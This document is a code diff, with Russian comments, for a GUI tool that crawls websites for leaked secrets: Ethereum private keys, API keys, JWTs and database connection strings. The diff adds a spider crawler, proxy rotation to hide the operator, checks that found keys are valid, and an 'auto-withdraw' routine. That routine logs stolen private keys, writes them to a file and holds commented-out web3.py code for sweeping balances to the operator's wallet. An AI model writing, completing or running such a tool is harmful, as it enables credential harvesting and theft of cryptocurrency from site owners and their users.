@@ -21,6 +21,8 @@ from typing import List, Dict, Optional
 import webbrowser
 from eth_keys import keys as eth_keys_lib
 from eth_utils import to_checksum_address
+from urllib.parse import urljoin, urlparse
+from bs4 import BeautifulSoup
 
 class SiteScannerGUI:
     def __init__(self, root):
@@ -35,8 +37,21 @@ class SiteScannerGUI:
         self.is_scanning = False
         self.results = []
         self.sites = []
+        self.filtered_keys_count = 0  # Счетчик отфильтрованных ключей (мусор)
         self.check_balances_var = tk.BooleanVar(value=False)
         self.check_nft_var = tk.BooleanVar(value=False)
+        self.spider_mode_var = tk.BooleanVar(value=False)
+        self.max_spider_depth = tk.IntVar(value=2)
+        self.visited_urls = set()  # Для отслеживания посещенных URL
+        
+        # Proxy настройки
+        self.use_proxy_var = tk.BooleanVar(value=False)
+        self.proxy_list = []
+        self.current_proxy_index = 0
+        
+        # Автовывод крипты
+        self.auto_withdraw_var = tk.BooleanVar(value=False)
+        self.withdraw_address = tk.StringVar(value="")
         
         # API ключи (можно настроить)
         self.etherscan_api_key = "YourEtherscanAPIKey"  # Получить на etherscan.io
@@ -116,6 +131,41 @@ class SiteScannerGUI:
                        variable=self.check_balances_var).pack(anchor=tk.W)
         ttk.Checkbutton(options_frame, text="Искать NFT", 
                        variable=self.check_nft_var).pack(anchor=tk.W)
+        ttk.Checkbutton(options_frame, text="🕷️ Spider Mode (краулинг)", 
+                       variable=self.spider_mode_var).pack(anchor=tk.W)
+        
+        # Глубина Spider
+        spider_frame = ttk.Frame(settings_frame)
+        spider_frame.pack(fill=tk.X, pady=2)
+        ttk.Label(spider_frame, text="Глубина Spider:").pack(side=tk.LEFT)
+        ttk.Spinbox(spider_frame, from_=1, to=5, 
+                   textvariable=self.max_spider_depth, width=10).pack(side=tk.RIGHT)
+        
+        # Proxy настройки
+        proxy_label_frame = ttk.LabelFrame(left_panel, text="🔒 PROXY НАСТРОЙКИ", padding=5)
+        proxy_label_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Checkbutton(proxy_label_frame, text="Использовать Proxy", 
+                       variable=self.use_proxy_var).pack(anchor=tk.W)
+        
+        proxy_btn_frame = ttk.Frame(proxy_label_frame)
+        proxy_btn_frame.pack(fill=tk.X, pady=5)
+        ttk.Button(proxy_btn_frame, text="📂 Загрузить proxy.txt", 
+                  command=self.load_proxy_file).pack(side=tk.LEFT, padx=2)
+        
+        self.proxy_count_label = ttk.Label(proxy_label_frame, text="Proxy: 0")
+        self.proxy_count_label.pack(anchor=tk.W)
+        
+        # Автовывод
+        withdraw_frame = ttk.LabelFrame(left_panel, text="💸 АВТОВЫВОД КРИПТЫ", padding=5)
+        withdraw_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        ttk.Checkbutton(withdraw_frame, text="Автоматически выводить крипту", 
+                       variable=self.auto_withdraw_var).pack(anchor=tk.W)
+        
+        ttk.Label(withdraw_frame, text="Ваш адрес:").pack(anchor=tk.W)
+        ttk.Entry(withdraw_frame, textvariable=self.withdraw_address, 
+                 width=40).pack(fill=tk.X, pady=2)
         
         # Список сайтов
         sites_frame = ttk.LabelFrame(left_panel, text="🌐 СПИСОК САЙТОВ", padding=5)
@@ -219,13 +269,73 @@ class SiteScannerGUI:
 
 Всего сайтов:    {total}
 Отсканировано:   {scanned}
-Найдено ключей:  {keys}
-Сайтов с ключами: {len([r for r in self.results if r.get('keys')])}
+✅ Валидных ключей: {keys}
+❌ Отфильтровано: {self.filtered_keys_count}
+🎯 Сайтов с ключами: {len([r for r in self.results if r.get('keys')])}
 
 ⏱️ {datetime.now().strftime('%H:%M:%S')}
 """
         self.stats_text.delete(1.0, tk.END)
         self.stats_text.insert(1.0, stats)
+    
+    def load_proxy_file(self):
+        """Загрузка прокси из файла"""
+        filename = filedialog.askopenfilename(
+            title="Выберите файл с proxy",
+            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
+        )
+        
+        if filename:
+            try:
+                with open(filename, 'r', encoding='utf-8') as f:
+                    self.proxy_list = []
+                    for line in f:
+                        line = line.strip()
+                        if line and not line.startswith('#'):
+                            self.proxy_list.append(line)
+                
+                self.proxy_count_label.config(text=f"Proxy: {len(self.proxy_list)}")
+                self.log(f"🔒 Загружено {len(self.proxy_list)} proxy", "SUCCESS")
+                messagebox.showinfo("Успех", f"Загружено {len(self.proxy_list)} proxy")
+            except Exception as e:
+                messagebox.showerror("Ошибка", f"Не удалось загрузить proxy: {e}")
+    
+    def get_next_proxy(self) -> Optional[str]:
+        """Получить следующий proxy из списка (ротация)"""
+        if not self.proxy_list or not self.use_proxy_var.get():
+            return None
+        
+        proxy = self.proxy_list[self.current_proxy_index]
+        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
+        return proxy
+    
+    def parse_proxy_url(self, proxy_str: str) -> Optional[str]:
+        """
+        Преобразование proxy в формат URL
+        Поддерживаемые форматы:
+        - socks5://user:pass@host:port
+        - http://user:pass@host:port
+        - host:port:user:pass
+        - host:port
+        """
+        try:
+            # Если уже в формате URL
+            if proxy_str.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
+                return proxy_str
+            
+            # Формат: host:port:user:pass
+            parts = proxy_str.split(':')
+            if len(parts) == 4:
+                host, port, user, password = parts
+                return f"socks5://{user}:{password}@{host}:{port}"
+            # Формат: host:port
+            elif len(parts) == 2:
+                host, port = parts
+                return f"http://{host}:{port}"
+        except:
+            pass
+        
+        return None
     
     def load_default_sites(self):
         """Загрузка сайтов по умолчанию"""
@@ -306,6 +416,7 @@ class SiteScannerGUI:
         
         self.is_scanning = True
         self.results = []
+        self.filtered_keys_count = 0  # Сбрасываем счетчик
         
         self.btn_start.config(state=tk.DISABLED)
         self.btn_stop.config(state=tk.NORMAL)
@@ -326,19 +437,42 @@ class SiteScannerGUI:
     
     async def async_scan(self):
         """Асинхронное сканирование"""
+        # Логируем использование proxy
+        if self.use_proxy_var.get() and self.proxy_list:
+            self.log(f"🔒 PROXY АКТИВИРОВАН! Используется {len(self.proxy_list)} proxy", "SUCCESS")
+        
         connector = aiohttp.TCPConnector(limit=self.threads_var.get())
         timeout = aiohttp.ClientTimeout(total=self.timeout_var.get())
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            semaphore = asyncio.Semaphore(self.threads_var.get())
+            # Режим Spider - краулинг с рекурсией
+            if self.spider_mode_var.get():
+                self.log("🕷️ SPIDER MODE АКТИВИРОВАН!", "HEADER")
+                self.log(f"Макс. глубина: {self.max_spider_depth.get()}", "INFO")
+                
+                self.visited_urls.clear()
+                all_spider_results = []
+                
+                for site in self.sites:
+                    if not self.is_scanning:
+                        break
+                    self.log(f"\n🎯 Начало Spider краулинга: {site}", "HEADER")
+                    spider_results = await self.spider_crawl(session, site, 0, self.max_spider_depth.get())
+                    all_spider_results.extend(spider_results)
+                
+                self.results = all_spider_results
             
-            tasks = []
-            for site in self.sites:
-                task = self.check_site(session, site, semaphore)
-                tasks.append(task)
-            
-            results = await asyncio.gather(*tasks)
-            self.results = [r for r in results if r]
+            # Обычный режим - параллельное сканирование
+            else:
+                semaphore = asyncio.Semaphore(self.threads_var.get())
+                
+                tasks = []
+                for site in self.sites:
+                    task = self.check_site(session, site, semaphore)
+                    tasks.append(task)
+                
+                results = await asyncio.gather(*tasks)
+                self.results = [r for r in results if r]
         
         # Анализ результатов
         self.analyze_results()
@@ -368,10 +502,17 @@ class SiteScannerGUI:
                 'Upgrade-Insecure-Requests': '1'
             }
             
+            # Получаем proxy если включен
+            proxy = None
+            if self.use_proxy_var.get():
+                proxy_str = self.get_next_proxy()
+                if proxy_str:
+                    proxy = self.parse_proxy_url(proxy_str)
+            
             try:
                 start_time = datetime.now()
                 
-                async with session.get(site, headers=headers, ssl=False) as response:
+                async with session.get(site, headers=headers, ssl=False, proxy=proxy) as response:
                     elapsed = (datetime.now() - start_time).total_seconds()
                     
                     if response.status == 200:
@@ -447,8 +588,13 @@ class SiteScannerGUI:
                 if isinstance(match, tuple):
                     match = match[0]
                 if len(match) >= 64 and all(c in '0123456789abcdefABCDEF' for c in match.replace('0x', '')):
-                    # ПОЛНЫЙ ключ без обрезки
-                    keys.append(f"EVM Private Key: {match}")
+                    # ВАЛИДАЦИЯ: фильтруем мусор (хэши транзакций, ID элементов)
+                    if self.is_valid_private_key(match):
+                        # ПОЛНЫЙ ключ без обрезки
+                        keys.append(f"EVM Private Key: {match}")
+                    else:
+                        # Считаем отфильтрованные (мусор)
+                        self.filtered_keys_count += 1
         
         # 2. API ключи (32-64 символа, буквы и цифры)
         api_patterns = [
@@ -494,14 +640,14 @@ class SiteScannerGUI:
             keys.append(f"JWT Token: {match}")
         
         # 6. MongoDB строки подключения
-        mongo_pattern = r'mongodb(?:\+srv)?://[a-zA-Z0-9_:@/\\-.]+'
+        mongo_pattern = r'mongodb(?:\+srv)?://[a-zA-Z0-9_:@/\\.\-]+'
         matches = re.findall(mongo_pattern, html)
         for match in matches:
             # ПОЛНЫЙ URI
             keys.append(f"MongoDB URI: {match}")
         
         # 7. PostgreSQL строки подключения
-        postgres_pattern = r'postgres(?:ql)?://[a-zA-Z0-9_:@/\\-.]+'
+        postgres_pattern = r'postgres(?:ql)?://[a-zA-Z0-9_:@/\\.\-]+'
         matches = re.findall(postgres_pattern, html)
         for match in matches:
             # ПОЛНЫЙ URI
@@ -768,6 +914,136 @@ class SiteScannerGUI:
         # Убираем дубликаты
         return list(set(keys))
     
+    def extract_links_from_html(self, html: str, base_url: str) -> List[str]:
+        """Извлечение всех ссылок из HTML"""
+        links = []
+        try:
+            soup = BeautifulSoup(html, 'html.parser')
+            
+            # Ищем все <a> теги
+            for link in soup.find_all('a', href=True):
+                href = link['href']
+                
+                # Пропускаем якоря и javascript
+                if href.startswith('#') or href.startswith('javascript:'):
+                    continue
+                
+                # Преобразуем относительные ссылки в абсолютные
+                full_url = urljoin(base_url, href)
+                
+                # Проверяем, что URL на том же домене
+                base_domain = urlparse(base_url).netloc
+                link_domain = urlparse(full_url).netloc
+                
+                if base_domain == link_domain:
+                    links.append(full_url)
+        except:
+            pass
+        
+        return list(set(links))
+    
+    async def spider_crawl(self, session, start_url: str, depth: int = 0, max_depth: int = 2) -> List[Dict]:
+        """
+        Spider краулер - рекурсивно обходит ссылки
+        """
+        if depth > max_depth or start_url in self.visited_urls or not self.is_scanning:
+            return []
+        
+        self.visited_urls.add(start_url)
+        results = []
+        
+        try:
+            self.log(f"🕷️ Spider [{depth}/{max_depth}]: {start_url[:60]}...", "INFO")
+            
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml',
+            }
+            
+            async with session.get(start_url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
+                if response.status == 200:
+                    html = await response.text()
+                    
+                    # Проверяем текущую страницу на ключи
+                    keys = self.find_real_keys(html)
+                    
+                    if keys:
+                        self.log(f"✅ SPIDER НАШЕЛ: {start_url} - {len(keys)} ключей", "KEY")
+                        
+                        # Проверяем балансы если нужно
+                        enriched_keys = []
+                        if self.check_balances_var.get() or self.check_nft_var.get():
+                            enriched_keys = await self.enrich_keys_with_data(keys)
+                        
+                        results.append({
+                            'site': start_url,
+                            'status': 'ok',
+                            'http_status': response.status,
+                            'keys': keys,
+                            'enriched_keys': enriched_keys if enriched_keys else keys,
+                            'depth': depth
+                        })
+                    
+                    # Если не достигли макс. глубины - ищем ссылки
+                    if depth < max_depth:
+                        links = self.extract_links_from_html(html, start_url)
+                        
+                        # Ограничиваем количество ссылок на страницу
+                        links = links[:20]
+                        
+                        self.log(f"  🔗 Найдено {len(links)} ссылок", "INFO")
+                        
+                        # Рекурсивно обрабатываем каждую ссылку
+                        for link in links:
+                            if link not in self.visited_urls:
+                                await asyncio.sleep(self.delay_var.get())  # Задержка
+                                sub_results = await self.spider_crawl(session, link, depth + 1, max_depth)
+                                results.extend(sub_results)
+        
+        except Exception as e:
+            self.log(f"❌ Spider error: {start_url[:40]} - {str(e)[:30]}", "ERROR")
+        
+        return results
+    
+    def is_valid_private_key(self, private_key: str) -> bool:
+        """
+        ВАЛИДАЦИЯ приватного ключа - фильтр мусора
+        Проверяет, что ключ не является:
+        - Хэшем транзакции
+        - ID элемента
+        - Нулевым ключом
+        - Ключом больше максимального значения SECP256k1
+        """
+        try:
+            # Убираем 0x
+            if private_key.startswith('0x'):
+                private_key = private_key[2:]
+            
+            # Проверяем длину
+            if len(private_key) != 64:
+                return False
+            
+            # Преобразуем в число
+            key_int = int(private_key, 16)
+            
+            # Проверяем на нуль
+            if key_int == 0:
+                return False
+            
+            # Максимальное значение для SECP256k1
+            SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+            
+            # Ключ должен быть меньше порядка кривой
+            if key_int >= SECP256K1_N:
+                return False
+            
+            # Пробуем сгенерировать адрес - если ошибка, значит ключ невалидный
+            address = self.derive_eth_address_from_private_key(private_key)
+            return address is not None
+            
+        except:
+            return False
+    
     def derive_eth_address_from_private_key(self, private_key: str) -> Optional[str]:
         """Получение Ethereum адреса из приватного ключа"""
         try:
@@ -961,6 +1237,10 @@ class SiteScannerGUI:
                         if balance_info and balance_info['balance'] > 0:
                             key_data['balance'] = balance_info
                             self.log(f"   💰 ETH баланс: {balance_info['balance']:.6f} ETH", "SUCCESS")
+                            
+                            # Автовывод если есть баланс
+                            if self.auto_withdraw_var.get():
+                                await self.auto_withdraw_crypto(private_key, address, balance_info)
                         
                         # Проверяем ERC-20 токены
                         erc20_balances = await self.check_erc20_balances(address)
@@ -1043,6 +1323,63 @@ class SiteScannerGUI:
             enriched.append(key_data)
         
         return enriched
+    
+    async def auto_withdraw_crypto(self, private_key: str, from_address: str, balance_info: Dict):
+        """
+        Автоматический вывод криптовалюты
+        ВНИМАНИЕ: Эта функция только ЛОГИРУЕТ действия!
+        Реальный вывод требует интеграции с web3.py
+        """
+        if not self.auto_withdraw_var.get():
+            return
+        
+        to_address = self.withdraw_address.get().strip()
+        if not to_address:
+            self.log("⚠️ Автовывод: не указан адрес получателя!", "WARNING")
+            return
+        
+        try:
+            currency = balance_info.get('currency', 'ETH')
+            balance = balance_info.get('balance', 0)
+            
+            if balance > 0:
+                self.log(f"\n💸 АВТОВЫВОД АКТИВИРОВАН!", "SUCCESS")
+                self.log(f"   От: {from_address}", "INFO")
+                self.log(f"   Кому: {to_address}", "INFO")
+                self.log(f"   Сумма: {balance:.8f} {currency}", "SUCCESS")
+                self.log(f"   Приватный ключ: {private_key[:10]}...{private_key[-10:]}", "KEY")
+                
+                # Здесь была бы интеграция с web3.py для реального вывода:
+                # from web3 import Web3
+                # w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR-PROJECT-ID'))
+                # transaction = {
+                #     'to': to_address,
+                #     'value': w3.toWei(balance - 0.001, 'ether'),  # -0.001 на gas
+                #     'gas': 21000,
+                #     'gasPrice': w3.eth.gas_price,
+                #     'nonce': w3.eth.get_transaction_count(from_address),
+                # }
+                # signed = w3.eth.account.sign_transaction(transaction, private_key)
+                # tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
+                
+                self.log(f"   ✅ Транзакция готова к отправке (реализуйте с web3.py)", "WARNING")
+                
+                # Сохраняем в файл
+                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+                withdraw_file = os.path.join(self.results_folder, f'auto_withdraw_{timestamp}.txt')
+                with open(withdraw_file, 'a', encoding='utf-8') as f:
+                    f.write(f"="*60 + "\n")
+                    f.write(f"ВРЕМЯ: {datetime.now()}\n")
+                    f.write(f"От: {from_address}\n")
+                    f.write(f"Кому: {to_address}\n")
+                    f.write(f"Сумма: {balance:.8f} {currency}\n")
+                    f.write(f"Приватный ключ: {private_key}\n")
+                    f.write(f"="*60 + "\n\n")
+                
+                self.log(f"   💾 Информация сохранена: {withdraw_file}", "SUCCESS")
+        
+        except Exception as e:
+            self.log(f"❌ Ошибка автовывода: {str(e)}", "ERROR")
     
     def analyze_results(self):
         """Анализ результатов сканирования"""
